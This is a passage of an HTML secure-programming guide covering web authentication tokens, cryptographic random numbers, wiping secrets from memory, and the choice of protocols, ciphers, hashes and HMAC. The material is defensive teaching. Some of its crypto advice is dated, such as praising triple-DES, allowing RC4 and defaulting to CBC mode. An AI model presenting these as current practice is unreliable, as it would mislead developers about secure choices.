afterwards).</P
><P
>It would be prudent to display the username, especially on important
screens, to help counter session fixation attacks.
If users are given feedback on their username, they may notice if they
don&#8217;t have their expected username.  This is helpful anyway if it&#8217;s
possible to have an unexpected username (e.g., a family that shares the
same machine).
Examples of important screens include those when a file is uploaded
that should be kept private.</P
><P
>One odd implementation issue: although the specifications for the
"Expires:" (expiration time) field for cookies
permit time zones, it turns out that some versions of
Microsoft&#8217;s Internet Explorer don&#8217;t implement time zones correctly
for cookie expiration.
Thus, you need to always use UTC time (also called Zulu time)
in cookie expiration times for maximum portability.
It&#8217;s a good idea in general to use UTC time for time values,
and convert when necessary for human display, since this eliminates other
time zone and daylight savings time issues.</P
><P
>If you include a sessionid in the authentication token, you can limit
access further.
Your server could <SPAN
CLASS="QUOTE"
>&#8220;track&#8221;</SPAN
> what pages a user has seen in a given session,
and only permit access to other appropriate pages from that point
(e.g., only those directly linked from those page(s)).
For example,
if a user is granted access to page foo.html, and page foo.html has
pointers to resources bar1.jpg and bar2.png, then accesses to bar4.cgi
can be rejected.
You could even kill the session, though only do this if the authentication
information is valid (otherwise, this would make it possible for
attackers to cause denial-of-service attacks on other users).
This would somewhat limit the access an attacker has, even if they
successfully hijack a session, though clearly an attacker with time
and an authentication token
could <SPAN
CLASS="QUOTE"
>&#8220;walk&#8221;</SPAN
> the links just as a normal user would.</P
><P
>One decision is whether or not to require the authentication token and/or
data to be sent over a secure connection (e.g., SSL).
If you send an authentication token
in the clear (non-secure), someone who intercepts the
token could do whatever the user could do until the expiration time.
Also, when you send data over an unencrypted link, there&#8217;s the risk of
unnoticed change by an attacker; if you&#8217;re worried that someone might change the
data on the way, then you need to authenticate the data being transmitted.
Encryption by itself doesn&#8217;t guarantee authentication, but it does make
corruption more likely to be detected, and typical libraries can support
both encryption and authentication in a TLS/SSL connection.
In general, if you&#8217;re encrypting a message, you should also authenticate it.
If your needs vary,
one alternative is to create two authentication tokens - one is used
only in a <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> connection for important operations, while the other
used for less-critical operations.
Make sure the token used for <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> connections is marked so that only
secure connections (typically encrypted SSL/TLS connections) are used.
If users aren&#8217;t really different, the authentication token could omit
the <SPAN
CLASS="QUOTE"
>&#8220;data&#8221;</SPAN
> entirely.</P
><P
>Again, make sure that the pages with this authentication token aren&#8217;t cached.
There are other reasonable schemes also; the goal of this text is
to provide at least one secure solution.
Many variations are possible.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="WEB-AUTHENTICATION-LOGOUT"
>11.2.3. Authenticating on the Web: Logging Out</A
></H3
><P
>You should always provide users with a mechanism to <SPAN
CLASS="QUOTE"
>&#8220;log out&#8221;</SPAN
> - this
is especially helpful for customers using shared browsers
(say at a library).
Your <SPAN
CLASS="QUOTE"
>&#8220;logout&#8221;</SPAN
> routine&#8217;s task is simple - just unset the client&#8217;s
authentication token.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="RANDOM-NUMBERS"
>11.3. Random Numbers</A
></H2
><P
>In many cases secure programs must generate <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> numbers that
cannot be guessed by an adversary.
Examples include session keys, public or private keys, symmetric keys,
nonces and IVs used in many protocols, salts, and so on.
Ideally, you should use a truly random source of data for random numbers,
such as values based on
radioactive decay (through precise timing of Geiger counter
clicks), atmospheric noise, or thermal noise in electrical circuits.
Some computers have a hardware component that functions as
a real random value generator, and if it&#8217;s available you should use it.</P
><P
>However, most computers don&#8217;t have hardware that generates truly
random values, so in most cases you need a way to generate random numbers
that is sufficiently random that an adversary can&#8217;t predict it.
In general, this means that you&#8217;ll need three things:
<P
></P
><UL
><LI
><P
>An <SPAN
CLASS="QUOTE"
>&#8220;unguessable&#8221;</SPAN
> state; typically this is done by measuring
variances in timing of low-level devices
(keystrokes, disk drive arm jitter, etc.)
in a way that an adversary cannot control.</P
></LI
><LI
><P
>A cryptographically strong pseudo-random number generator (PRNG), which
uses the state to generate <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> numbers.</P
></LI
><LI
><P
>A large number of bits (in both the seed and the resulting value used).
There&#8217;s no point in having a strong PRNG if you only have a few possible values,
because this makes it easy for an attacker to use brute force attacks.
The number of bits necessary varies depending on the circumstance, however,
since these are often used as cryptographic keys, the normal rules of
thumb for keys apply.
For a symmetric key (result), I&#8217;d use at least 112 bits (3DES), 128 bits is
a little better, and 160 bits or more is even safer.</P
></LI
></UL
>
Typically the PRNG uses the state to generate some values, and then
some of its values and other unguessable inputs are used to update the state.
There are lots of ways to attack these systems.
For example, if an attacker can control or view inputs to the state
(or parts of it), the attacker may be able
to determine your supposedly <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> number.</P
><P
>A real danger with PRNGs is that most computer language libraries include
a large set of pseudo-random number generators (PRNGs)
which are <EM
>inappropriate</EM
> for security purposes.
Let me say it again:
<EM
>do not use typical random number generators for security
purposes</EM
>.
Typical library PRNGs
are intended for use in simulations, games, and so on; they are
<EM
>not</EM
> sufficiently random for use
in security functions such as key generation.
Most non-cryptographic
library PRNGs are some variation of <SPAN
CLASS="QUOTE"
>&#8220;linear congruential generators&#8221;</SPAN
>,
where the <SPAN
CLASS="QUOTE"
>&#8220;next&#8221;</SPAN
> random value is computed as "(aX+b)modm"
(where X is the previous value).
Good linear congruential generators are fast and have useful statistical
properties, making them appropriate for their intended uses.
The problem with such PRNGs is that future values can be easily deduced
by an attacker (though they may appear random).
Other algorithms for generating random numbers quickly, such as
quadratic generators and cubic generators, have also been broken
[Schneier 1996].
In short, you have to use cryptographically strong PRNGs to
generate random numbers in secure applications - ordinary random number
libraries are not sufficient.</P
><P
>Failing to correctly generate truly random values for keys has caused
a number of problems, including holes in Kerberos,
the X window system, and NFS [Venema 1996].</P
><P
>If possible, you should use system services
(typically provided by the operating system) that are expressly designed
to create cryptographically secure random values.
For example,
the Linux kernel (since 1.3.30) includes a random number generator, which
is sufficient for many security purposes.
This random number generator  gathers  environmental  noise
from  device  drivers  and  other  sources into an entropy pool.
When accessed as /dev/random, random bytes are only returned
within the estimated number of bits of noise in the entropy pool
(when the entropy pool is empty, the call blocks until additional
environmental noise is gathered).
When accessed as /dev/urandom, as many bytes as are requested are
returned even when the entropy pool is exhausted.
If you are using the random values for cryptographic purposes (e.g.,
to generate a key) on Linux, use /dev/random.
*BSD systems also include /dev/random.
Solaris users with the SUNWski package also have /dev/random.
Note that if a hardware random number generator is available and its
driver is installed, it will be used instead.
More information is available in the system documentation random(4).</P
><P
>On other systems, you&#8217;ll need to find another way to get truly random results.
One possibility for other Unix-like systems
is the Entropy Gathering Daemon (EGD), which monitors system
activity and hashes it into random values; you can get it at
<A
HREF="http://www.lothar.com/tech/crypto"
TARGET="_top"
>http://www.lothar.com/tech/crypto</A
>.
You might consider using a
cryptographic hash function on PRNG outputs.
By using a hash algorithm, even if the PRNG turns out to be guessable,
this means that the attacker must now also break the hash function.</P
><P
>If you have to implement a strong PRNG yourself,
a good choice for a cryptographically strong (and patent-unencumbered)
PRNG is the Yarrow algorithm; you can learn more about Yarrow from
<A
HREF="http://www.counterpane.com/yarrow.html"
TARGET="_top"
>http://www.counterpane.com/yarrow.html</A
>.
Some other PRNGs can be useful, but many widely-used ones
have known weaknesses that may or may not matter depending on your application.
Before implementing a PRNG yourself, consult the literature, such as
[Kelsey 1998] and [McGraw 2000a].
You should also examine
<A
HREF="http://www.ietf.org/rfc/rfc1750.txt"
TARGET="_top"
>IETF RFC 1750</A
>.
NIST has some useful information; see the
<A
HREF="http://csrc.nist.gov/publications/nistpubs/800-22/sp-800-22-051501.pdf"
TARGET="_top"
>NIST publication 800-22</A
> and
<A
HREF="http://csrc.nist.gov/publications/nistpubs/800-22/errata-sheet.pdf"
TARGET="_top"
>NIST errata</A
>.
You should know about the
<A
HREF="http://stat.fsu.edu/~geo/diehard.html"
TARGET="_top"
>diehard tests</A
> too.
You might want to examine
the paper titled
"how Intel checked its PRNG", but unfortunately that paper appears to be
unavailable now.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PROTECT-SECRETS"
>11.4. Specially Protect Secrets (Passwords and Keys) in User Memory</A
></H2
><P
>If your application must handle passwords or non-public keys
(such as session keys, private keys, or secret keys), try to hide them
and overwrite them immediately after using them so they have minimal exposure.
<A
HREF="http://www.newscientist.com/news/news.jsp?id=ns99995064"
TARGET="_top"
>Tal Garfinkel has shown that many programs fail to do so,
and that this is a serious problem.</A
></P
><P
>Systems such as Linux support the mlock() and mlockall() calls to
keep memory from being paged to disk (since someone might acquire the
key later from the swap file).
Note that on Linux before version 2.6.9
this is a privileged system call, which causes its
own issues (do I grant the program superuser privileges so it can call
mlock, if it doesn&#8217;t need them otherwise?).
The Linux kernel version 2.6.9 and greater allow user processes to
lock a limited amount of memory, so in that case, always use mlock()
for memory used to store private keys and/or valuable passwords.
Keep the amount of locked memory to a minimum, treating it as a precious
resource.
If a system allowed users to lock lots of memory, it&#8217;d be easy to
halt the whole system (by forcing it to run out of memory),
which is why this request is privileged or severely restricted.</P
><P
>Also, if your program handles such secret values, be sure to disable creating
core dumps (via ulimit).  Otherwise, an attacker may be able to halt the
program and find the secret value in the data dump.</P
><P
>Beware - normally processes can monitor other processes through
the calls for debuggers (e.g., via ptrace(2) and the /proc pseudo-filesystem)
[Venema 1996]
Kernels usually protect against these monitoring routines if the process is
setuid or setgid
(on the few ancient ones that don&#8217;t, there really isn&#8217;t a good way to
defend yourself other than upgrading).
Thus, if your process manages secret values, you probably should make it
setgid or setuid (to a different unprivileged group or user) to forceably
inhibit this kind of monitoring.
Unless you need it to be setuid, use setgid (since this grants fewer
privileges).</P
><P
>Then there&#8217;s the problem of being able to actually overwrite the value, which
often becomes language and compiler specific.
In many languages, you need to make sure that you store
such information in mutable locations, and then overwrite those locations.
For example,
in Java, don&#8217;t use the type String to store a password because Strings are
immutable (they will not be overwritten until garbage-collected and
then reused, possibly a far time in the future).
Instead, in Java use char[] to store a password, so it can be
immediately overwritten.
In Ada, use type String (an array of characters),
and not type Unbounded_String, to make sure
that you have control over the contents.</P
><P
>In many languages (including C and C++),
be careful that the compiler doesn&#8217;t optimize away the "dead code"
for overwriting the value - since in this case it&#8217;s not dead code.
Many compilers, including many C/C++ compilers, remove writes 
to stores that are no longer used - this is often referred to as
"dead store removal."
Unfortunately, if the write is really to overwrite the value of a secret,
this means that code that appears to be correct will be silently discareded.
Ada provides the pragma Inspection_Point; place this after the
code erasing the memory, and that way you can be certain that
the object containing the secret will really be erased
(and that the the overwriting won&#8217;t be optimized away).</P
><P
>A Bugtraq post by Andy Polyakov (November 7, 2002) reported that
the C/C++ compilers gcc version 3 or higher, SGI MIPSpro, and the Microsoft
compilers eliminated simple inlined calls to memset
intended to overwrite secrets.
This is allowed by the C and C++ standards.
Other C/C++ compilers (such as gcc less than version 3) preserved the inlined
call to memset at all optimization levels, showing that the issue
is compiler-specific.
Simply declaring that the destination data is volatile doesn&#8217;t
help on all compilers; both the MIPSpro and Microsoft compilers
ignored simple "volatilization".
Simply "touching" the first byte of the secret data doesn&#8217;t help either;
he found that the MIPSpro and GCC&#62;=3 cleverly nullify only the first byte
and leave the rest intact (which is actually quite clever - the problem
is that the compiler&#8217;s cleverness is interfering with our goals).
One approach that
seems to work on all platforms is to
write your own implementation of memset with internal "volatilization"
of the first argument (this code is based on a
<A
HREF="http://online.securityfocus.com/archive/82/298061/2002-10-27/2002-11-02/0"
TARGET="_top"
>workaround proposed by Michael Howard</A
>):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> void *guaranteed_memset(void *v,int c,size_t n)
  { volatile char *p=v; while (n--) *p++=c; return v; }</PRE
></FONT
></TD
></TR
></TABLE
>
Then place this definition into an external file to force the function to
be external (define the function in a corresponding .h file, and #include
the file in the callers, as is usual).
This approach appears to be safe
at any optimization level (even if the function gets inlined).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CRYPTO"
>11.5. Cryptographic Algorithms and Protocols</A
></H2
><P
>Often cryptographic algorithms and protocols are necessary to keep
a system secure, particularly when communicating through an untrusted
network such as the Internet.
Where possible, use cryptographic techniques to authenticate information and
keep the information private
(but don&#8217;t assume that simple encryption automatically authenticates as well).
Generally you&#8217;ll need to use a suite of available tools to
secure your application.</P
><P
>For background information and code, you should probably look at
the classic text <SPAN
CLASS="QUOTE"
>&#8220;Applied Cryptography&#8221;</SPAN
> [Schneier 1996].
The newsgroup <SPAN
CLASS="QUOTE"
>&#8220;sci.crypt&#8221;</SPAN
> has a series of FAQ&#8217;s; you can find them
at many locations, including
<A
HREF="http://www.landfield.com/faqs/cryptography-faq"
TARGET="_top"
>http://www.landfield.com/faqs/cryptography-faq</A
>.
Linux-specific resources include the Linux Encryption HOWTO at
<A
HREF="http://marc.mutz.com/Encryption-HOWTO/"
TARGET="_top"
>http://marc.mutz.com/Encryption-HOWTO/</A
>.
A discussion on how protocols use the basic algorithms can be
found in [Opplinger 1998].
A useful collection of papers on how to apply cryptography in
protocols can be found in [Stallings 1996].
What follows here is just a few comments; these areas are rather
specialized and covered more thoroughly elsewhere.</P
><P
>Cryptographic protocols and algorithms are difficult to get right,
so do not create your own.
Instead, where you can, use protocols and algorithms that are
widely-used, heavily analyzed, and accepted as secure.
When you must create anything, give the approach wide public review and
make sure that professional security analysts examine it for problems.
In particular, do not create your own encryption algorithms unless you are
an expert in cryptology, know what you&#8217;re doing, and plan to spend
years in professional review of the algorithm.
Creating encryption algorithms (that are any good) is a task for experts only.</P
><P
>A number of algorithms are patented; even if the owners permit
<SPAN
CLASS="QUOTE"
>&#8220;free use&#8221;</SPAN
> at the moment, without a signed contract they can always
change their minds later, putting you at extreme risk later.
In general, avoid all patented algorithms -
in most cases there&#8217;s an unpatented approach that is at least as good
or better technically, and by doing so you avoid a large number
of legal problems.</P
><P
>Another complication is that many counties regulate or restrict
cryptography in some way.
A survey of legal issues is available at the <SPAN
CLASS="QUOTE"
>&#8220;Crypto Law Survey&#8221;</SPAN
> site,
<A
HREF="http://rechten.kub.nl/koops/cryptolaw/"
TARGET="_top"
>http://rechten.kub.nl/koops/cryptolaw/</A
>.</P
><P
>Often, your software should provide a way to
reject <SPAN
CLASS="QUOTE"
>&#8220;too small&#8221;</SPAN
> keys, and let the user set what <SPAN
CLASS="QUOTE"
>&#8220;too small&#8221;</SPAN
> is.
For RSA keys, 512 bits is too small for use.
There is increasing evidence that
1024 bits for RSA keys is not enough either;
Bernstein has suggested techniques that simplify brute-forcing RSA, and
other work based on it
(such as Shamir and Tromer&#8217;s "Factoring Large Numbers with the TWIRL device")
now suggests that 1024 bit keys can be broken in a year
by a $10 Million device.
You may want to
make 2048 bits the minimum for RSA if you really want a secure system.
For more about RSA specifically, see
<A
HREF="http://www.rsasecurity.com/rsalabs/technotes/bernstein.html"
TARGET="_top"
>RSA&#8217;s
commentary on Bernstein&#8217;s work</A
>.
For a more general discussion of key length and other general
cryptographic algorithm issues, see
<A
HREF="http://csrc.nist.gov/encryption/kms/key-management-guideline-(workshop).pdf"
TARGET="_top"
>NIST&#8217;s key management workshop in November 2001</A
>.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="CRYPTO-PROTOCOLS"
>11.5.1. Cryptographic Protocols</A
></H3
><P
>When you need a security protocol, try to use standard-conforming protocols
such as IPSec, SSL (soon to be TLS), SSH, S/MIME, OpenPGP/GnuPG/PGP,
and Kerberos.
Each has advantages and disadvantages;
many of them overlap somewhat in functionality, but each tends to be
used in different areas:

<P
></P
><UL
><LI
><P
>Internet Protocol Security (IPSec).
IPSec provides encryption and/or authentication at the IP packet level.
However, IPSec is often used in a way that
only guarantees authenticity of two
communicating hosts, not of the users.
As a practical matter, IPSec usually requires low-level support
from the operating system (which not all implement) and
an additional keyring server that must be configured.
Since IPSec can be used as a "tunnel" to secure packets belonging to
multiple users and multiple hosts, it is especially useful for
building a Virtual Private Network (VPN) and connecting a remote machine.
As of this time, it is much less often used to secure communication
from individual clients to servers.
The new version of the Internet Protocol, IPv6, comes with
IPSec <SPAN
CLASS="QUOTE"
>&#8220;built in,&#8221;</SPAN
> but IPSec also works with the more common IPv4 protocol.
Note that if you use IPSec, don&#8217;t use the encryption mode without the
authentication, because the authentication also acts as
integrity protection.</P
></LI
><LI
><P
>Secure Socket Layer (SSL) / TLS.
SSL/TLS works over TCP and tunnels other protocols using TCP, adding
encryption, authentication of the server, and optional authentication
of the client (but authenticating clients using SSL/TLS requires
that clients have configured X.509 client certificates, something
rarely done).
SSL version 3 is widely used; TLS is a later adjustment to SSL that
strengthens its security and improves its flexibility.
Currently there is a slow transition going on from SSLv3 to TLS, aided
because implementations can easily try to use TLS and then back off to SSLv3
without user intervention.
Unfortunately, a few bad SSLv3 implementations cause problems with the
backoff, so you may need a preferences setting to allow users to skip
using TLS if necessary.
Don&#8217;t use SSL version 2, it has some serious security weaknesses.</P
><P
>SSL/TLS is the primary method for protecting http (web) transactions.
Any time you use an "https://" URL, you&#8217;re using SSL/TLS.
Other protocols that often use SSL/TLS include POP3 and IMAP.
SSL/TLS usually use a separate TCP/IP port
number from the unsecured port, which the IETF is a little unhappy about
(because it consumes twice as many ports; there are solutions to this).
SSL is relatively easy to use in programs, because
most library implementations allow programmers to use operations
similar to the operations on standard sockets like
SSL_connect(), SSL_write(), SSL_read(), etc.
A widely used OSS/FS implementation of SSL (as well as other capabilities)
is OpenSSL, available at
<A
HREF="http://www.openssl.org"
TARGET="_top"
>http://www.openssl.org</A
>.</P
></LI
><LI
><P
>OpenPGP and S/MIME.
There are two competing, essentially incompatible standards for
securing email: OpenPGP and S/MIME.
OpenPHP is based on the PGP application; an OSS/FS implementation is
GNU Privacy Guard from
<A
HREF="http://www.gnupg.org"
TARGET="_top"
>http://www.gnupg.org</A
>.
Currently, their certificates are often not interchangeable;
work is ongoing to repair this.</P
></LI
><LI
><P
>SSH.
SSH is the primary method of securing <SPAN
CLASS="QUOTE"
>&#8220;remote terminals&#8221;</SPAN
> over an 
internet, and it also includes methods for
tunelling X Windows sessions.
However, it&#8217;s been extended to support single sign-on and
general secure tunelling for TCP streams, so it&#8217;s often
used for securing other data streams too (such as CVS accesses).
The most popular implementation of SSH is OpenSSH
<A
HREF="http://www.openssh.com"
TARGET="_top"
>http://www.openssh.com</A
>,
which is OSS/FS.
Typical uses of SSH allows the client to authenticate that the
server is truly the server, and
then the user enters a password to authenticate the user
(the password is encrypted and sent to the other system for verification).
Current versions of SSH can store private keys, allowing users to not
enter the password each time.
To prevent man-in-the-middle attacks, SSH records keying information
about servers it talks to; that means that typical use of
SSH is vulnerable to a man-in-the-middle attack during the
very first connection, but it can detect problems afterwards.
In contrast, SSL generally uses a certificate authority, which eliminates
the first connection problem but requires special setup (and payment!) to
the certificate authority.</P
></LI
><LI
><P
>Kerberos.
Kerberos is a protocol for single sign-on and authenticating users
against a central authentication and key distribution server. Kerberos
works by giving authenticated users "tickets", granting them access to
various services on the network.
When clients then contact servers, the servers can verify the tickets.
Kerberos is a primary method for securing and supporting authentication
on a LAN, and for establishing shared secrets (thus, it needs to be
used with other algorithms for the actual protection of communication).
Note that to use Kerberos, both the client and server have to include
code to use it, and since not everyone has a Kerberos setup, this has
to be optional - complicating the use of Kerberos in some programs.
However, Kerberos is widely used.</P
></LI
></UL
></P
><P
>Many of these protocols allow you to select a number of different
algorithms, so you&#8217;ll still need to pick reasonable defaults for
algorithms (e.g., for encryption).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="SYMMETRIC-ENCRYPTION"
>11.5.2. Symmetric Key Encryption Algorithms</A
></H3
><P
>The use, export, and/or import of implementations of
encryption algorithms are restricted in many countries, and the laws
can change quite rapidly.
Find out what the rules are before trying to build applications using
cryptography.</P
><P
>For secret key (bulk data) encryption algorithms,
use only encryption algorithms that have been openly published and withstood
years of attack, and check on their patent status.
I would recommend using the
new Advanced Encryption Standard (AES), also known as Rijndahl --
a number of cryptographers have analyzed it and not found any serious weakness
in it, and I believe it has been through enough analysis
to be trustworthy now.
In August 2002 researchers Fuller and Millar
discovered a mathematical property of the cipher that,
while not an attack, might be exploitable and turned into an attack
(the approach may actually has serious consequences for some other
algorithms, too).
However, heavy-duty worldwide analysis has yet to
provide serious evidence that AES is actually vulnerable
(see [Landau 2004] for more technical information on Rijndael).
It&#8217;s always worth staying tuned for future work, of course.
A good alternative to AES is the Serpent algorithm, which is slightly slower
but is very resistant to attack.
For many applications triple-DES is a very good encryption algorithm; it
has a reasonably lengthy key (112 bits), no patent issues, and
a very long history of withstanding attacks (it&#8217;s withstood attacks far
longer than any other encryption algorithm with reasonable key length in the
public literature, so it&#8217;s probably the safest publicly-available
symmetric encryption algorithm when properly implemented).
However, triple-DES is very slow when implemented in software, so
triple-DES can be considered <SPAN
CLASS="QUOTE"
>&#8220;safest but slowest.&#8221;</SPAN
>
Twofish appears to be a good encryption algorithm, but there are some
lingering questions - Sean Murphy and Fauzan Mirza showed that Twofish
has properties that cause many academics to be concerned (though as of yet
no one has managed to exploit these properties).
MARS is highly resistent to <SPAN
CLASS="QUOTE"
>&#8220;new and novel&#8221;</SPAN
> attacks, but it&#8217;s more complex
and is impractical on small-ability smartcards.
For the moment I would avoid Twofish - it&#8217;s quite likely that this will never
be exploitable, but it&#8217;s hard to be sure and there are alternative
algorithms which don&#8217;t have these concerns.
Don&#8217;t use IDEA - it&#8217;s subject to U.S. and European patents.
Don&#8217;t use stupid algorithms such as XOR with a constant or constant string,
the ROT (rotation)
scheme, a Vinegere ciphers, and so on - these can be trivially broken
with today&#8217;s computers.
Don&#8217;t use <SPAN
CLASS="QUOTE"
>&#8220;double DES&#8221;</SPAN
> (using DES twice) - that&#8217;s subject to a
<SPAN
CLASS="QUOTE"
>&#8220;man in the middle&#8221;</SPAN
> attack that triple-DES avoids.
Your protocol should support multiple encryption algorithms, anyway;
that way, when an encryption algorithm is broken,
users can switch to another one.</P
><P
>For symmetric-key encryption (e.g., for bulk encryption), don&#8217;t use a
key length less than 90 bits if you want the information
to stay secret through 2016
(add another bit for every additional 18 months of security) [Blaze 1996].
For encrypting worthless data, the old DES algorithm has some value,
but with modern hardware it&#8217;s too easy to break DES&#8217;s 56-bit key using
brute force.
If you&#8217;re using DES, don&#8217;t just use the ASCII text key as the key -
parity is in the least (not most) significant bit, so most DES algorithms
will encrypt using a key value well-known to adversaries;
instead, create a hash of the key and set the parity bits correctly
(and pay attention to error reports from your encryption routine).
So-called <SPAN
CLASS="QUOTE"
>&#8220;exportable&#8221;</SPAN
> encryption algorithms only have effective key lengths
of 40 bits, and are essentially worthless;
in 1996 an attacker could spend $10,000 to break such keys in twelve minutes
or use idle computer time to break them in a few days,
with the time-to-break halving every 18 months in either case.</P
><P
>Block encryption algorithms can be used in a number of different modes, such as
<SPAN
CLASS="QUOTE"
>&#8220;electronic code book&#8221;</SPAN
> (ECB) and <SPAN
CLASS="QUOTE"
>&#8220;cipher block chaining&#8221;</SPAN
> (CBC).
In nearly all cases, use CBC, and do <EM
>not</EM
> use ECB mode -
in ECB mode, the same block of data always returns the same result inside
a stream, and this is often enough to reveal what&#8217;s encrypted.
Many modes, including CBC mode, require an <SPAN
CLASS="QUOTE"
>&#8220;initialization vector&#8221;</SPAN
> (IV).
The IV doesn&#8217;t need to be secret, but it does need to be unpredictable by
an attacker.
Don&#8217;t reuse IV&#8217;s across sessions - use a new IV each time you start a session.</P
><P
>There are a number of different streaming encryption algorithms, but
many of them have patent restrictions.
I know of no patent or technical issues with WAKE.
RC4 was a trade secret of RSA Data Security Inc; it&#8217;s been leaked since,
and I know of no real legal impediment to its use, but RSA Data
Security has often threatened
court action against users of it (it&#8217;s not at all clear what RSA Data
Security could do,
but no doubt they could tie up users in worthless court cases).
If you use RC4, use it as intended - in particular, always discard the
first 256 bytes it generates, or you&#8217;ll be vulnerable to attack.
SEAL is patented by IBM - so don&#8217;t use it.
SOBER is patented; the patent owner has claimed that it will allow many
uses for free if permission is requested, but this creates an impediment for
later use.
Even more interestingly, block encryption algorithms can be used in modes that
turn them into stream ciphers, and users who want stream ciphers should
consider this approach (you&#8217;ll be able to choose between far more
publicly-available algorithms).</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="PUBLIC-KEY-ENCRYPTION"
>11.5.3. Public Key Algorithms</A
></H3
><P
>For public key cryptography (used, among other things, for
signing and sending secret keys), there are only a few
widely-deployed algorithms.
One of the most widely-used algorithms is RSA;
RSA&#8217;s algorithm was patented, but only in the U.S., and that patent
expired in September 2000, so RSA can be freely used.
Never decrypt or sign a raw value that an attacker gives you directly using
RSA and expose the result, because that could expose the private key
(this isn&#8217;t a problem in practice, because most protocols involve
signing a hash computed by the user - not the raw value - or don&#8217;t expose
the result).
Never decrypt or sign the exact same raw value multiple times
(the original can be exposed).
Both of these can be solved by always adding random padding
(PGP does this) - the usual approach is called
Optimal Asymmetric Encryption Padding (OAEP).</P
><P
>The Diffie-Hellman key exchange algorithm is widely used to permit
two parties to agree on a session key.  By itself it doesn&#8217;t guarantee that
the parties are who they say they are, or that there is no middleman, but
it does strongly help defend against passive listeners; its patent
expired in 1997.
If you use Diffie-Hellman to create a shared secret, be sure to hash it first
(there&#8217;s an attack if you use its shared value directly).</P
><P
>NIST developed the digital signature standard (DSS) (it&#8217;s a
modification of the ElGamal cryptosystem) for digital signature
generation and verification; one of the conditions for its development
was for it to be patent-free.</P
><P
>RSA, Diffie-Hellman, and El Gamal&#8217;s techniques require more bits for the
keys for equivalent security compared to typical symmetric keys;
a 1024-bit key in these systems is supposed to be roughly equivalent
to an 80-bit symmetric key.
A 512-bit RSA key is considered completely unsafe;
Nicko van Someren has demonstrated that such small RSA keys
can be factored in 6 weeks using only already-available office hardware
(never mind equipment designed for the job).
In the past, a 1024-bit RSA key was considered reasonably secure, but
recent advancements in factorization algorithms
(e.g., by D. J. Bernstein) have raised concerns that perhaps even 1024 bits
is not enough for an RSA key.
Netcraft noted back in 2012 that
both the CA/B Forum (a consortium of certificate authorities)
and NIST have recommended that RSA public keys below 2048 bits
be phased out by 2013.
Today, RSA users should be using keys that are at least 2048 bits long.</P
><P
>If you need a public key that requires far fewer bits (e.g., for
a smartcard), then you might use elliptic
curve cryptography (IEEE P1363 has some suggested curves; finding curves
is hard).
However, be careful - elliptic curve cryptography isn&#8217;t patented, but
certain speedup techniques are patented.
Elliptic curve cryptography is fast enough
that it really doesn&#8217;t need these speedups anyway for its usual use of
encrypting session / bulk encryption keys.
In general, you shouldn&#8217;t try to do bulk encryption with elliptic keys;
symmetric algorithms are much faster and are better-tested for the job.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="HASH"
>11.5.4. Cryptographic Hash Algorithms</A
></H3
><P
>Some programs need a one-way cryptographic hash algorithm, that is, a function
that takes an <SPAN
CLASS="QUOTE"
>&#8220;arbitrary&#8221;</SPAN
> amount of data and generates a fixed-length
number that hard for an attacker
to invert (e.g., it&#8217;s difficult for an attacker to
create a different set of data to generate that same value).
Historically MD5 was widely-used,
but by the 1990s there were warnings that MD5 had become too weak
[van Oorschot 1994] [Dobbertin 1996].
Papers have since shown that MD5 simply can&#8217;t be trusted as
a cryptographic hash - see
<A
HREF="http://cryptography.hyperlink.cz/MD5_collisions.html"
TARGET="_top"
>http://cryptography.hyperlink.cz/MD5_collisions.html</A
>.
Don&#8217;t use the original SHA (now called <SPAN
CLASS="QUOTE"
>&#8220;SHA-0&#8221;</SPAN
>);
SHA-0 had the same weakness that MD5 does.
After MD5 was broken, SHA-1 was the typical favorite, and it worked
well for years.
However, SHA-1 has also become too weak today;
SHA-1 should never be used in new programs for security,
and existing programs should be implementing alternative hash algorithms.
Today&#8217;s programs should be using better and more secure
hash algorithms such as SHA-256 / SHA-384 / SHA-512 or the newer SHA-3.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="INTEGRITY-CHECK"
>11.5.5. Integrity Checking</A
></H3
><P
>When communicating, you need some sort of integrity check (don&#8217;t depend
just on encryption, since an attacker can then induce changes of information
to <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> values).
This can be done with hash algorithms, but don&#8217;t just use a hash function
directly (this exposes users to an <SPAN
CLASS="QUOTE"
>&#8220;extension&#8221;</SPAN
> attack - the attacker
can use the hash value, add data of their choosing, and compute the new hash).
The usual approach is <SPAN
CLASS="QUOTE"
>&#8220;HMAC&#8221;</SPAN
>, which computes the integrity check as
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  H(k xor opad, H(k xor ipad, data)).</PRE
></FONT
></TD
></TR
></TABLE
>
where H is the hash function and k is the key.
This is defined in detail in IETF RFC 2104.</P
><P
>Note that in the HMAC approach, a receiver can forge the same data as a sender.
This isn&#8217;t usually a problem, but if this must be avoided, then use
public key methods and have the sender <SPAN
CLASS="QUOTE"
>&#8220;sign&#8221;</SPAN
> the data with the sender
private key - this avoids this forging attack, but it&#8217;s more expensive and
for most environments isn&#8217;t necessary.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="RMAC"
>11.5.6. Randomized Message Authentication Mode (RMAC)</A
></H3
><P
><A
